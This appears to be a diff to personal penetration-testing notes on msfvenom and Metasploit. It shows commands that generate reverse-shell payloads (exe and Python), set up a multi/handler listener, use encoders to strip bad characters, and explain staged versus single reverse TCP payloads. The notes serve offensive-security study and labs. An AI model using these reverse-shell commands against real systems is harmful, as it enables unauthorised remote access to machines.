@@ -1,7 +1,9 @@
 `msfvenom -p PAYLOAD_PATH LHOST=X.X.X.X -f exe(FORMAT) -o payload.exe(OUTPUT)`
 `msfvenom -l payloads`
 `msfvenom --list formats`
-*Encoders are ot intended to bypass security, but may help* `msfvenom -l encoders`
+
+`-e ENCODING -b"\x00...BYTES_TO_FILTER"
+
 #### Handlers
 `use exploit/multi/handler` -> `set payload php/reverse_php` *(optional) omit for meterpreter shell*-\> `set lhost MY_IP` -\> `set lport MY_IP` -\> `run` *infers listener running*
 #### Payload Examples
@@ -13,9 +15,13 @@
 - Python: `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`
 - `msfvenom -l payloads | grep meterpreter`, shows reverse and bind meterpreter shells on different platforms
 
+#### Encoders
+Often they will remove bad characters (like non-alphanumeric chars that are filtered by input fields). The payload will then be decoded at run time, which requires a prepended decoder stub.
+*Encoders are not intended to bypass security, but may help*:  `msfvenom -l encoders`
+
 *Consider: target OS, programs on the system, available connection types*
 
 # Single vs. Staged
 Stages: Downloaded by the stager after access is achieved on the target
-`generic/shell_reverse_tcp` - denotes an single payload
-`windows/x64/shell/reverse_tcp` - denotes a staged payload (stager + stage)
+`windows/shell_reverse_tcp` - denotes a single payload, injecting into memory and calling back automatically
+`windows/x64/shell/reverse_tcp` - denotes a staged payload (stager) which injects, then must reach out for part 2 of the exploit (stage), which is hosted by the attacker usually by with `exploit/multi/handler` 
